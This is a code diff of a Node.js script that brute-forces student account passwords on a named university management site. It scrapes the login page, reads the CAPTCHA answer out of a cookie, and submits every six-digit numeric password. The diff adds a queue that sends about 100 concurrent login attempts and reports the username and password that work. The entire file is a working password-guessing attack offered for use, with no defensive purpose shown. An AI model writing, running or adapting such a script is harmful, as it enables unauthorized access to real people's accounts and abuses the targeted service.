@@ -1,165 +1,132 @@
 "use strict";
 var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
+    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
     return new (P || (P = Promise))(function (resolve, reject) {
         function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
         function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
-        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
+        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
         step((generator = generator.apply(thisArg, _arguments || [])).next());
     });
 };
-var __generator = (this && this.__generator) || function (thisArg, body) {
-    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
-    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
-    function verb(n) { return function (v) { return step([n, v]); }; }
-    function step(op) {
-        if (f) throw new TypeError("Generator is already executing.");
-        while (_) try {
-            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
-            if (y = 0, t) op = [op[0] & 2, t.value];
-            switch (op[0]) {
-                case 0: case 1: t = op; break;
-                case 4: _.label++; return { value: op[1], done: false };
-                case 5: _.label++; y = op[1]; op = [0]; continue;
-                case 7: op = _.ops.pop(); _.trys.pop(); continue;
-                default:
-                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
-                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
-                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
-                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
-                    if (t[2]) _.ops.pop();
-                    _.trys.pop(); continue;
-            }
-            op = body.call(thisArg, _);
-        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
-        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
-    }
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
 };
-exports.__esModule = true;
-var FormData = require("form-data");
-var node_fetch_1 = require("node-fetch");
-var cheerio = require("cheerio");
-var fs = require("fs");
-var os = require("os");
-var log = console.log;
-var baseUrl = "http://mis.sse.ustc.edu.cn/";
-var pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
+Object.defineProperty(exports, "__esModule", { value: true });
+const FormData = require("form-data");
+const node_fetch_1 = __importDefault(require("node-fetch"));
+const cheerio = require("cheerio");
+const utils_1 = __importDefault(require("./utils"));
+const p_queue_1 = __importDefault(require("p-queue"));
+const log = console.log;
+const baseUrl = "http://mis.sse.ustc.edu.cn/";
+const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g;
 function worker(username) {
-    return new Promise(function (resolve, reject) {
-        var times = 5; // retry times
-        var success = false;
-        var view_state = "";
-        var password = "000000";
-        function app() {
-            return __awaiter(this, void 0, void 0, function () {
-                var mypass, result, cookieJar, sessionId, body, $, imgUrl, url, r, str, validateCode, sum_1, formData, login, iflysse, err_1;
-                return __generator(this, function (_a) {
-                    switch (_a.label) {
-                        case 0:
-                            log("username: ", username);
-                            mypass = password;
-                            _a.label = 1;
-                        case 1:
-                            _a.trys.push([1, 6, , 7]);
-                            return [4 /*yield*/, node_fetch_1["default"](baseUrl)];
-                        case 2:
-                            result = _a.sent();
-                            if (parseInt(password) > 999999) {
-                                resolve(false);
-                                return [2 /*return*/];
-                            }
-                            if (success) {
-                                return [2 /*return*/];
-                            }
-                            cookieJar = [];
-                            sessionId = (result.headers.get("set-cookie") || "").split(";")[0];
-                            cookieJar.push(sessionId);
-                            return [4 /*yield*/, result.text()];
-                        case 3:
-                            body = _a.sent();
-                            $ = cheerio.load(body);
-                            view_state = $("#__VIEWSTATE").val();
-                            imgUrl = body.match(pattern) || [""];
-                            url = baseUrl + imgUrl[0].replace("&amp;", "&");
-                            return [4 /*yield*/, node_fetch_1["default"](url, {
-                                    headers: {
-                                        "cookie": cookieJar.join(";")
-                                    }
-                                })];
-                        case 4:
-                            r = _a.sent();
-                            str = r.headers.get("set-cookie") || "";
-                            cookieJar.push(str.split(";")[0]);
-                            validateCode = (str.match(/[0-9]{4}/) || [""])[0];
-                            log("validate code:", validateCode);
-                            sum_1 = 0;
-                            validateCode.split("").forEach(function (val) {
-                                sum_1 += parseInt(val);
-                            });
-                            log("sum:", sum_1);
-                            log("session", cookieJar);
-                            formData = new FormData();
-                            formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
-                            formData.append("__VIEWSTATE", view_state);
-                            formData.append("winLogin$sfLogin$txtUserLoginID", username);
-                            formData.append('winLogin$sfLogin$txtPassword', mypass);
-                            formData.append('winLogin$sfLogin$txtValidate', sum_1 + "");
-                            return [4 /*yield*/, node_fetch_1["default"](baseUrl + "default.aspx", {
-                                    method: "post",
-                                    headers: {
-                                        cookie: cookieJar.join(";")
-                                    },
-                                    body: formData
-                                })];
-                        case 5:
-                            login = _a.sent();
-                            iflysse = (login.headers.get("set-cookie") || "").split(";")[0];
+    return new Promise((resolve, reject) => {
+        let success = false;
+        let view_state = "";
+        let password = "093500";
+        username = username.toLowerCase();
+        log("username: ", username);
+        /**
+         * 获取登陆页的html
+         */
+        function main() {
+            return __awaiter(this, void 0, void 0, function* () {
+                try {
+                    const result = yield node_fetch_1.default(baseUrl);
+                    const cookieJar = new Map();
+                    const sessionId = utils_1.default.getCookie(result);
+                    cookieJar.set("sessionId", sessionId);
+                    const body = yield result.text();
+                    const $ = cheerio.load(body);
+                    view_state = $("#__VIEWSTATE").val(); //view state字段
+                    const imgUrl = body.match(pattern) || [""];
+                    const url = baseUrl + imgUrl[0].replace("&amp;", "&"); //验证码url
+                    const r = yield node_fetch_1.default(url, {
+                        headers: {
+                            "cookie": Array.from(cookieJar.values()).join(";")
+                        }
+                    });
+                    const validate = utils_1.default.getCookie(r); //验证码
+                    cookieJar.set("validate", validate);
+                    const validateCode = (validate.match(/[0-9]{4}/) || [""])[0];
+                    log("validate code:", validateCode);
+                    let sum = 0;
+                    validateCode.split("").forEach(val => {
+                        sum += parseInt(val);
+                    });
+                    log("sum:", sum);
+                    log("session", cookieJar);
+                    const queue = new p_queue_1.default({ concurrency: 100 });
+                    const tryPass = () => {
+                        const mypass = password;
+                        password = increase(password);
+                        /**
+                         * 组装数据
+                         */
+                        const formData = new FormData();
+                        formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
+                        formData.append("__VIEWSTATE", view_state);
+                        formData.append("winLogin$sfLogin$txtUserLoginID", username);
+                        formData.append('winLogin$sfLogin$txtPassword', mypass);
+                        formData.append('winLogin$sfLogin$txtValidate', sum + "");
+                        return node_fetch_1.default(baseUrl + "default.aspx", {
+                            method: "post",
+                            headers: {
+                                cookie: Array.from(cookieJar.values()).join(";")
+                            },
+                            body: formData
+                        }).then(login => {
+                            /**
+                             * iflysse是登陆成功时拿到的cookie值
+                             */
+                            const iflysse = utils_1.default.getCookie(login);
                             if (iflysse.length === 0) {
                                 log("failed ", "password: ", mypass);
-                                increase();
-                                cookieJar.length = 0;
-                                app();
                             }
                             else {
                                 log("success ", "用户名: ", username, "密码: ", mypass);
-                                fs.appendFile("result.txt", "success " + "用户名: " + username + "密码: " + os.EOL, function (err) {
-                                    console.log(err);
-                                });
                                 success = true;
-                                resolve(true);
-                                return [2 /*return*/];
+                                resolve("success " + "用户名: " + username + "密码: " + mypass);
                             }
-                            cookieJar.push(iflysse);
-                            return [3 /*break*/, 7];
-                        case 6:
-                            err_1 = _a.sent();
-                            log(err_1);
-                            if (times > 0) {
-                                app(); //retry
-                                times--;
-                            }
-                            else {
-                                reject(err_1);
-                            }
-                            return [3 /*break*/, 7];
-                        case 7: return [2 /*return*/];
+                            return;
+                        })
+                            .catch(reject);
+                    };
+                    for (let i = 0; i < 110; i++) {
+                        queue.add(tryPass);
                     }
-                });
+                    queue.on("active", () => {
+                        log("size", queue.size);
+                        if (queue.size < 100 && !success && parseInt(password) <= 999999) {
+                            queue.add(tryPass);
+                        }
+                        else {
+                            if (success) {
+                                queue.pause();
+                            }
+                            if (parseInt(password) > 999999) {
+                                queue.pause();
+                            }
+                        }
+                    });
+                }
+                catch (error) {
+                    log(error);
+                }
             });
         }
-        ;
-        function increase() {
-            password = "" + (parseInt(password) + 1);
-            if (password.length < 6) {
-                var len = password.length;
-                for (var i = 0; i < 6 - len; i++) {
-                    password = 0 + password;
-                }
-            }
-        }
-        for (var i = 0; i < 2; i++) {
-            increase();
-            app();
-        }
+        main();
     });
 }
 exports.worker = worker;
+function increase(num) {
+    num = "" + (parseInt(num) + 1);
+    if (num.length < 6) {
+        const len = num.length;
+        for (let i = 0; i < 6 - len; i++) {
+            num = 0 + num;
+        }
+    }
+    return num;
+}
